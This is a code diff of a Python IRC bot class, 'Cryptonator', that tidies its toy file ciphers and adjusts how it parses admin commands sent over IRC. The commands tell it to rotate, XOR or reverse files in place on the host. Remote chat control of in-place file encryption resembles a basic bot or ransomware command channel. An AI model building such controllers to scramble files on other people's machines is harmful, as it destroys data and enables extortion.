@@ -66,26 +66,9 @@ class Cryptonator:
 
         return 2
 
-    ################
-    # CRYPTO FUNCS #
-    ################
-
-    def bin_rot(self, path, encrypt=True):
-
-        # Read file's bytes
-        f_bytes = []
-        with open(path, 'rb') as f:
-            f_bytes = f.read()
-
-        # Rotate in appropriate direction
-        displacement = 2 if encrypt else -2
-
-        # Rotate bytes
-        f_bytes = f_bytes[displacement:] + f_bytes[:displacement]
-
-        # Output to same filepath
-        with open(path, 'wb') as f:
-            f.write(f_bytes)
+    #############
+    # AUX FUNCS #
+    #############
 
     # Auxiliary functions for all_byte_rot
     def rotate_left(self, byte):
@@ -104,6 +87,29 @@ class Cryptonator:
 
         return ret & 255
 
+    ################
+    # CRYPTO FUNCS #
+    ################
+
+    # Simple ceasar cipher
+    def bin_rot(self, path, encrypt=True):
+
+        # Read file's bytes
+        f_bytes = []
+        with open(path, 'rb') as f:
+            f_bytes = f.read()
+
+        # Rotate in appropriate direction
+        displacement = 2 if encrypt else -2
+
+        # Rotate bytes
+        f_bytes = f_bytes[displacement:] + f_bytes[:displacement]
+
+        # Output to same filepath
+        with open(path, 'wb') as f:
+            f.write(f_bytes)
+    
+    # Simple byte per byte ceasar
     def byte_rot(self, path, encrypt=True):
 
         # Read file's bytes
@@ -124,6 +130,9 @@ class Cryptonator:
         with open(path, 'wb') as f:
             f.write(bytes(f_bytes_list))
 
+    # Encrypts xorwise with hardcoded key,
+    # since xor is symmetrical, there is no
+    # encrypt / decrypt parameter
     def byte_xor(self, path):
 
         # Read file's bytes
@@ -142,6 +151,7 @@ class Cryptonator:
         with open(path, 'wb') as f:
             f.write(bytes(f_bytes_list))
 
+    # Combines bytewise rotation and xor cipher
     def byte_rot_xor(self, path, encrypt=True):
 
         if encrypt:
@@ -151,6 +161,8 @@ class Cryptonator:
             self.byte_xor(path)
             self.byte_rot(path, encrypt)
 
+    # Reverses binary, this is also symmetrical
+    # so no encrypt / decrypt parameter
     def invert(self, path):
 
         # Read file's bytes
@@ -180,41 +192,41 @@ class Cryptonator:
             return 0
 
         sender = msg.split('!', 1)[0][1:].lower()
-        text = msg.split('PRIVMSG',1)[1].split(':',1)[1]
+        text = msg.split('PRIVMSG',1)[1].split(':',1)[1].lower()
 
         # Validate sender before replying
         if len(sender) > 16 or sender != self.admin:
             return 0
         
         # Choose what action to take
-        if 'Hello' in text:
+        if 'hello' in text:
             return self.tell('World!')
 
-        elif 'FILE:' in text:
-            command = text.split(' FILE:')[0]
-            path = text.split(' FILE:')[1]
+        elif 'file:' in text:
+            command = text.split(' file:')[0]
+            path = text.split(' file:')[1]
 
             if not os.path.isfile(path):
-                return 3
+                return self.tell('FILE DOES NOT EXIST')
 
-            if command == 'bin rot encrypt':
+            if command == 'binrot encrypt':
                 self.bin_rot(path)
-            elif command == 'bin rot decrypt':
+            elif command == 'binrot decrypt':
                 self.bin_rot(path, False)
-            elif command == 'byte rot encrypt':
+            elif command == 'byterot encrypt':
                 self.byte_rot(path)
-            elif command == 'byte rot decrypt':
+            elif command == 'byterot decrypt':
                 self.byte_rot(path, False)
-            elif command == 'byte xor':
+            elif command == 'bytexor':
                 self.byte_xor(path)
             elif command == 'invert':
                 self.invert(path)
-            elif command == 'byte rotxor encrypt':
+            elif command == 'byterotxor encrypt':
                 self.byte_rot_xor(path)
-            elif command == 'byte rotxor decrypt':
+            elif command == 'byterotxor decrypt':
                 self.byte_rot_xor(path, False)
 
-        elif 'EXIT' in text:
+        elif 'exit' in text:
             return self.exit()
 
         return 0
